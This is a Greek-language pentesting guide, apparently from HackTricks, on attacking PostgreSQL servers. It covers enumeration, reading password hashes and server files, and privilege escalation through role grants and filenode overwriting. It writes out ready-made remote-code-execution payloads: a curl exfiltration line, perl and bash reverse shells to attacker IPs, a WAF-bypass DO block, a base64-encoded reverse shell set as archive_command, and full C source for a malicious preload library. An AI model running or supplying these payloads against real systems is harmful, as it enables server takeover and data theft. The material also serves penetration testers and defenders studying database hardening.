# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Βασικές Πληροφορίες**

**PostgreSQL** περιγράφεται ως ένα **αντικειμενο-σχεσιακό σύστημα βάσης δεδομένων** που είναι **ανοιχτού κώδικα**. Αυτό το σύστημα όχι μόνο χρησιμοποιεί τη γλώσσα SQL αλλά και την επεκτείνει με επιπλέον δυνατότητες. Οι δυνατότητές του το καθιστούν ιδανική επιλογή για προγραμματιστές και οργανισμούς.

**Προεπιλεγμένη θύρα:** 5432, και αν αυτή η θύρα χρησιμοποιείται ήδη φαίνεται ότι postgresql θα χρησιμοποιήσει την επόμενη θύρα (5433 πιθανότατα) που δεν χρησιμοποιείται.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Σύνδεση & Basic Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Αν κατά την εκτέλεση του **`\list`** βρείτε μια βάση δεδομένων με όνομα **`rdsadmin`**, τότε γνωρίζετε ότι βρίσκεστε μέσα σε μια **AWS postgresql database**.

Για περισσότερες πληροφορίες σχετικά με το **πώς να εκμεταλλευτείτε μια PostgreSQL βάση δεδομένων** δείτε:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Αυτόματη Απογραφή
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Σύμφωνα με [**this research**](https://www.exploit-db.com/papers/13084), όταν μια προσπάθεια σύνδεσης αποτυγχάνει, το `dblink` ρίχνει την εξαίρεση `sqlclient_unable_to_establish_sqlconnection` που περιλαμβάνει μια εξήγηση του σφάλματος. Παρακάτω παρατίθενται παραδείγματα αυτών των λεπτομερειών.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host είναι εκτός λειτουργίας

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port είναι κλειστή
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port είναι ανοιχτό
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
ή
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port είναι ανοιχτή ή φιλτραρισμένη
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Στις συναρτήσεις PL/pgSQL δεν είναι προς το παρόν δυνατό να ληφθούν λεπτομέρειες εξαιρέσεων. Ωστόσο, αν έχετε άμεση πρόσβαση στον PostgreSQL server, μπορείτε να ανακτήσετε τις απαραίτητες πληροφορίες. Αν η εξαγωγή usernames και passwords από τους system tables δεν είναι εφικτή, μπορείτε να εξετάσετε τη χρήση της wordlist attack method που συζητήθηκε στην προηγούμενη ενότητα, καθώς μπορεί να δώσει θετικά αποτελέσματα.

## Καταγραφή Δικαιωμάτων

### Ρόλοι

| Role Types     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Ο ρόλος έχει προνόμια superuser                                                                                                                      |
| rolinherit     | Ο ρόλος κληρονομεί αυτόματα τα προνόμια των ρόλων των οποίων είναι μέλος                                                                            |
| rolcreaterole  | Ο ρόλος μπορεί να δημιουργήσει περισσότερους ρόλους                                                                                                  |
| rolcreatedb    | Ο ρόλος μπορεί να δημιουργήσει βάσεις δεδομένων                                                                                                      |
| rolcanlogin    | Ο ρόλος μπορεί να log in. Δηλαδή, αυτός ο ρόλος μπορεί να δοθεί ως ο αρχικός session authorization identifier                                        |
| rolreplication | Ο ρόλος είναι replication role. Ένας replication role μπορεί να ξεκινήσει replication connections και να δημιουργήσει και να διαγράψει replication slots. |
| rolconnlimit   | Για ρόλους που μπορούν να log in, αυτό ορίζει τον μέγιστο αριθμό ταυτόχρονων συνδέσεων που μπορεί να κάνει αυτός ο ρόλος. -1 σημαίνει χωρίς όριο.       |
| rolpassword    | Όχι ο κωδικός (αναγράφεται πάντα ως `********`)                                                                                                      |
| rolvaliduntil  | Χρόνος λήξης password (χρησιμοποιείται μόνο για password authentication); null αν δεν υπάρχει λήξη                                                   |
| rolbypassrls   | Ο ρόλος παρακάμπτει κάθε row-level security policy, see [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) for more information. |
| rolconfig      | Προεπιλογές ειδικές για τον ρόλο για run-time configuration variables                                                                                |
| oid            | ID του ρόλου                                                                                                                                         |

#### Ενδιαφέρουσες Ομάδες

- Αν είστε μέλος του **`pg_execute_server_program`** μπορείτε να **εκτελείτε** προγράμματα
- Αν είστε μέλος του **`pg_read_server_files`** μπορείτε να **διαβάζετε** αρχεία
- Αν είστε μέλος του **`pg_write_server_files`** μπορείτε να **γράφετε** αρχεία

> [!TIP]
> Σημειώστε ότι στο Postgres ένας/μια **user**, μια **group** και ένας **role** είναι το **ίδιο**. Εξαρτάται απλώς από το **πώς το χρησιμοποιείτε** και αν το **επιτρέπετε να login**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Πίνακες
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Συναρτήσεις
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Ενέργειες στο σύστημα αρχείων

### Ανάγνωση καταλόγων και αρχείων

Από αυτό το [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) τα μέλη της ορισμένης ομάδας **`DEFAULT_ROLE_READ_SERVER_FILES`** (ονομαζόμενης **`pg_read_server_files`**) και οι **super users** μπορούν να χρησιμοποιήσουν τη μέθοδο **`COPY`** σε οποιοδήποτε μονοπάτι (δείτε `convert_and_check_filename` στο `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Θυμήσου ότι αν δεν είσαι superuser αλλά έχεις τα δικαιώματα **CREATEROLE** μπορείς να **κάνεις τον εαυτό σου μέλος αυτής της ομάδας:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Υπάρχουν **άλλες postgres functions** που μπορούν να χρησιμοποιηθούν για να **διαβάσουν αρχείο ή να απαριθμήσουν έναν κατάλογο**. Μόνο **superusers** και **χρήστες με ρητά δικαιώματα** μπορούν να τις χρησιμοποιήσουν:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Μπορείτε να βρείτε **περισσότερες συναρτήσεις** στο [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Απλή εγγραφή αρχείων

Μόνο **super users** και μέλη του **`pg_write_server_files`** μπορούν να χρησιμοποιήσουν την εντολή copy για να γράψουν αρχεία.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Θυμηθείτε ότι αν δεν είστε super user αλλά έχετε τα δικαιώματα **`CREATEROLE`** μπορείτε να **κάνετε τον εαυτό σας μέλος αυτής της ομάδας:** 
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Θυμηθείτε ότι το COPY δεν μπορεί να χειριστεί newline chars, επομένως ακόμη και αν χρησιμοποιείτε ένα base64 payload ν**α στείλετε μία γραμμή**.\
Ένας πολύ σημαντικός περιορισμός αυτής της τεχνικής είναι ότι **`copy` δεν μπορεί να χρησιμοποιηθεί για την εγγραφή δυαδικών αρχείων καθώς τροποποιεί κάποιες δυαδικές τιμές.**

### **Μεταφόρτωση δυαδικών αρχείων**

Ωστόσο, υπάρχουν **άλλες τεχνικές για τη μεταφόρτωση μεγάλων δυαδικών αρχείων:**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Ενημέρωση δεδομένων πίνακα PostgreSQL μέσω εγγραφής σε τοπικό αρχείο

Εάν έχετε τα απαραίτητα δικαιώματα για ανάγνωση και εγγραφή των αρχείων του PostgreSQL server, μπορείτε να ενημερώσετε οποιονδήποτε πίνακα στον server με το **overwriting του συνδεδεμένου filenode** στον [the PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html). **More on this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Απαιτούμενα βήματα:

1.  Προσδιορίστε τον κατάλογο δεδομένων του PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Σημείωση:** Εάν δεν μπορείτε να ανακτήσετε την τρέχουσα διαδρομή του data directory από τα settings, μπορείτε να ερωτήσετε την κύρια έκδοση του PostgreSQL μέσω του `SELECT version()` query και να προσπαθήσετε brute-force τη διαδρομή. Συνηθισμένες διαδρομές data directory σε Unix εγκαταστάσεις του PostgreSQL είναι `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Ένα συνηθισμένο cluster name είναι `main`.

2.  Αποκτήστε μια σχετική διαδρομή προς το filenode που σχετίζεται με τον στόχο πίνακα

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Αυτό το query θα πρέπει να επιστρέψει κάτι σαν `base/3/1337`. Η πλήρης διαδρομή στο δίσκο θα είναι `$DATA_DIRECTORY/base/3/1337`, π.χ. `/var/lib/postgresql/13/main/base/3/1337`.

3.  Κατεβάστε το filenode μέσω των συναρτήσεων `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Πάρτε τον τύπο δεδομένων που συνδέεται με τον στόχο πίνακα

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Χρησιμοποιήστε το [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) για να [edit the filenode]; ορίστε όλες τις boolean σημαίες `rol*` σε 1 για πλήρη δικαιώματα.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Επαναφορτώστε το επεξεργασμένο filenode μέσω των συναρτήσεων `lo_*`, και αντικαταστήστε το αρχικό αρχείο στον δίσκο

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Προαιρετικά)_ Εκκαθαρίστε την cache του πίνακα στη μνήμη τρέχοντας ένα ακριβό SQL query

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Τώρα θα πρέπει να δείτε ενημερωμένες τιμές του πίνακα στο PostgreSQL.

Μπορείτε επίσης να γίνετε superadmin επεξεργαζόμενοι τον πίνακα `pg_authid`. **Δείτε** [**the following section**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE σε πρόγραμμα**

Από την [version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), μόνο **super users** και μέλη της ομάδας **`pg_execute_server_program`** μπορούν να χρησιμοποιήσουν copy για RCE (παράδειγμα με exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Παράδειγμα εκτέλεσης:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Θυμηθείτε ότι αν δεν είστε super user αλλά έχετε την άδεια **`CREATEROLE`** μπορείτε να **κάνετε τον εαυτό σας μέλος αυτής της ομάδας:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Ή χρησιμοποιήστε το module `multi/postgres/postgres_copy_from_program_cmd_exec` από **metasploit**.\
Περισσότερες πληροφορίες για αυτή την ευπάθεια [**here**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Ενώ αναφέρθηκε ως CVE-2019-9193, Postges δήλωσε ότι αυτό ήταν ένα [feature and will not be fixed](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Bypass keyword filters/WAF to reach COPY PROGRAM

Σε SQLi contexts με stacked queries, ένα WAF μπορεί να αφαιρέσει ή να μπλοκάρει τη literal λέξη-κλειδί `COPY`. Μπορείτε να κατασκευάσετε δυναμικά την εντολή και να την εκτελέσετε μέσα σε ένα PL/pgSQL DO block. Για παράδειγμα, φτιάξτε το αρχικό C με `CHR(67)` για να παρακάμψετε αφελή φίλτρα και να EXECUTE την συναρμολογημένη εντολή:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
This pattern avoids static keyword filtering and still achieves OS command execution via `COPY ... PROGRAM`. It is especially useful when the application echoes SQL errors and allows stacked queries.

### RCE with PostgreSQL Languages


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE with PostgreSQL extensions

Μόλις έχετε μάθει από το προηγούμενο post πώς να ανεβάσετε binary αρχεία, μπορείτε να δοκιμάσετε να αποκτήσετε RCE ανεβάζοντας ένα postgresql extension και φορτώνοντάς το.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### PostgreSQL configuration file RCE

> [!TIP]
> The following RCE vectors are especially useful in constrained SQLi contexts, as all steps can be performed through nested SELECT statements

Το **αρχείο ρυθμίσεων** του PostgreSQL είναι **εγγράψιμο** από τον **postgres user**, ο οποίος είναι αυτός που τρέχει τη βάση δεδομένων, οπότε ως **superuser** μπορείτε να γράψετε αρχεία στο filesystem, και συνεπώς να **αντικαταστήσετε αυτό το αρχείο.**

![](<../images/image (322).png>)

#### **RCE with ssl_passphrase_command**

More information [about this technique here](https://pulsesecurity.co.nz/articles/postgres-sqli).

Το αρχείο ρυθμίσεων έχει ορισμένες ενδιαφέρουσες παραμέτρους που μπορούν να οδηγήσουν σε RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Path to the private key of the database
- `ssl_passphrase_command = ''` If the private file is protected by password (encrypted) postgresql will **execute the command indicated in this attribute**.
- `ssl_passphrase_command_supports_reload = off` **If** this attribute is **on** the **command** executed if the key is protected by password **will be executed** when `pg_reload_conf()` is **executed**.

Τότε, ένας επιτιθέμενος θα χρειαστεί να:

1. **Εξαγωγή του ιδιωτικού κλειδιού** από τον server
2. **Κρυπτογράφηση** του ληφθέντος ιδιωτικού κλειδιού:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Αντικατάσταση**
4. **Εξαγωγή** της τρέχουσας postgresql **διαμόρφωσης**
5. **Αντικατάσταση** της **διαμόρφωσης** με την αναφερόμενη διαμόρφωση παραμέτρων:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Execute `pg_reload_conf()`

Κατά τη δοκιμή παρατήρησα ότι αυτό θα λειτουργήσει μόνο αν το **αρχείο ιδιωτικού κλειδιού έχει δικαιώματα 640**, είναι **ιδιοκτησία του root** και της **ομάδας ssl-cert ή postgres** (ώστε ο χρήστης postgres να μπορεί να το διαβάσει), και βρίσκεται στο _/var/lib/postgresql/12/main_.

#### **RCE with archive_command**

**More** [**information about this config and about WAL here**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Μια άλλη παράμετρος στο αρχείο ρυθμίσεων που είναι εκμεταλλεύσιμη είναι `archive_command`.

Για να λειτουργήσει αυτό, η ρύθμιση `archive_mode` πρέπει να είναι `'on'` ή `'always'`. Αν αυτό ισχύει, μπορούμε να αντικαταστήσουμε την εντολή στο `archive_command` και να την αναγκάσουμε να εκτελεστεί μέσω των λειτουργιών WAL (write-ahead logging).

Τα γενικά βήματα είναι:

1. Check whether archive mode is enabled: `SELECT current_setting('archive_mode')`
2. Overwrite `archive_command` with the payload. For eg, a reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Reload the config: `SELECT pg_reload_conf()`
4. Force the WAL operation to run, which will call the archive command: `SELECT pg_switch_wal()` or `SELECT pg_switch_xlog()` for some Postgres versions

##### Editing postgresql.conf via Large Objects (SQLi-friendly)

Όταν χρειάζονται εγγραφές πολλαπλών γραμμών (π.χ., για να ορίσετε πολλούς GUCs), χρησιμοποιήστε PostgreSQL Large Objects για να διαβάσετε και να αντικαταστήσετε πλήρως τη διαμόρφωση από SQL. Αυτή η προσέγγιση είναι ιδανική σε SQLi περιβάλλοντα όπου το `COPY` δεν μπορεί να χειριστεί newlines ή binary-safe writes.

Example (adjust the major version and path if needed, e.g. version 15 on Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
Αυτό παρέχει αξιόπιστη εκτέλεση εντολών OS μέσω του `archive_command` ως ο χρήστης `postgres`, εφόσον το `archive_mode` είναι ενεργοποιημένο. Στην πράξη, η ρύθμιση χαμηλού `archive_timeout` μπορεί να προκαλέσει ταχεία εκκίνηση χωρίς να απαιτείται ρητή εναλλαγή WAL.

#### **RCE με preload libraries**

More information [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

Αυτός ο φορέας επίθεσης αξιοποιεί τις ακόλουθες μεταβλητές διαμόρφωσης:

- `session_preload_libraries` -- libraries that will be loaded by the PostgreSQL server at the client connection.
- `dynamic_library_path` -- list of directories where the PostgreSQL server will search for the libraries.

Μπορούμε να θέσουμε την τιμή του `dynamic_library_path` σε έναν κατάλογο εγγράψιμο από τον χρήστη `postgres` που τρέχει τη βάση δεδομένων, π.χ. τον κατάλογο `/tmp/`, και να ανεβάσουμε εκεί ένα κακόβουλο `.so` αντικείμενο. Έπειτα, θα αναγκάσουμε τον PostgreSQL server να φορτώσει τη νεοανεβασμένη βιβλιοθήκη μας συμπεριλαμβάνοντάς την στην μεταβλητή `session_preload_libraries`.

Τα βήματα της επίθεσης είναι:

1. Κατεβάστε το αρχικό `postgresql.conf`
2. Συμπεριλάβετε τον κατάλογο `/tmp/` στην τιμή του `dynamic_library_path`, π.χ. `dynamic_library_path = '/tmp:$libdir'`
3. Συμπεριλάβετε το όνομα της κακόβουλης βιβλιοθήκης στην τιμή `session_preload_libraries`, π.χ. `session_preload_libraries = 'payload.so'`
4. Ελέγξτε την κύρια έκδοση του PostgreSQL μέσω του ερωτήματος `SELECT version()`
5. Μεταγλωττίστε τον κώδικα της κακόβουλης βιβλιοθήκης με το σωστό πακέτο ανάπτυξης PostgreSQL. Παράδειγμα κώδικα:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Μεταγλώττιση του κώδικα:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Ανεβάστε το κακόβουλο `postgresql.conf`, που δημιουργήθηκε στα βήματα 2-3, και αντικαταστήστε το αρχικό
7. Ανεβάστε το `payload.so` από το βήμα 5 στον κατάλογο `/tmp`
8. Επαναφορτώστε τη διαμόρφωση του server επανεκκινώντας τον ή εκτελώντας το ερώτημα `SELECT pg_reload_conf()`
9. Στην επόμενη σύνδεση στη DB, θα λάβετε τη σύνδεση reverse shell.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

According to the [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _Roles having **`CREATEROLE`** privilege can **grant or revoke membership in any role** that is **not** a **superuser**._

Έτσι, αν έχετε **`CREATEROLE`** permission μπορείτε να δώσετε στον εαυτό σας πρόσβαση σε άλλες **roles** (που δεν είναι superuser) που μπορούν να σας δώσουν τη δυνατότητα να διαβάζετε & να γράφετε αρχεία και να εκτελείτε εντολές:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Αλλαγή Password

Οι χρήστες με αυτόν τον ρόλο μπορούν επίσης να **αλλάξουν** τα **passwords** άλλων **non-superusers**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Είναι αρκετά συχνό να βρείτε ότι **τοπικοί χρήστες μπορούν να συνδεθούν σε PostgreSQL χωρίς να δώσουν κωδικό πρόσβασης**. Επομένως, μόλις αποκτήσετε **δικαιώματα εκτέλεσης κώδικα**, μπορείτε να καταχραστείτε αυτά τα δικαιώματα για να αποκτήσετε το ρόλο **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Αυτό είναι συνήθως εφικτό λόγω των παρακάτω γραμμών στο αρχείο **`pg_hba.conf`**:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

Στο [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) εξηγείται πώς ήταν δυνατό να γίνει **privesc** σε Postgres GCP εκμεταλλευόμενοι το ALTER TABLE privilege που είχε δοθεί στον χρήστη.

Όταν προσπαθείς να **κάνεις άλλον χρήστη ιδιοκτήτη ενός πίνακα** θα πρέπει να λάβεις ένα **σφάλμα** που το αποτρέπει, αλλά προφανώς το GCP έδωσε αυτή την **επιλογή στον χρήστη postgres που δεν ήταν superuser** στο GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Συνδυάζοντας αυτή την ιδέα με το γεγονός ότι όταν οι εντολές **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) εκτελούνται σε έναν **πίνακα με μια συνάρτηση ευρετηρίου**, η **συνάρτηση** καλείται ως μέρος της εντολής με τα δικαιώματα του **ιδιοκτήτη του πίνακα**. Είναι δυνατό να δημιουργήσεις ένα index με μια συνάρτηση και να δώσεις δικαιώματα ιδιοκτήτη σε έναν **super user** για αυτόν τον πίνακα, και στη συνέχεια να τρέξεις ANALYZE πάνω στον πίνακα με την κακόβουλη συνάρτηση που θα μπορεί να εκτελέσει εντολές επειδή χρησιμοποιεί τα προνόμια του ιδιοκτήτη.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Εκμετάλλευση

1. Ξεκινήστε δημιουργώντας έναν νέο πίνακα.
2. Εισάγετε μερικά μη σχετιζόμενα δεδομένα στον πίνακα για να παρέχετε δεδομένα στη συνάρτηση index.
3. Αναπτύξτε μια κακόβουλη συνάρτηση index που περιέχει payload για εκτέλεση κώδικα, επιτρέποντας την εκτέλεση μη εξουσιοδοτημένων εντολών.
4. ALTER τον owner του πίνακα σε "cloudsqladmin", που είναι ο superuser ρόλος του GCP αποκλειστικά χρησιμοποιούμενος από το Cloud SQL για τη διαχείριση και συντήρηση της βάσης δεδομένων.
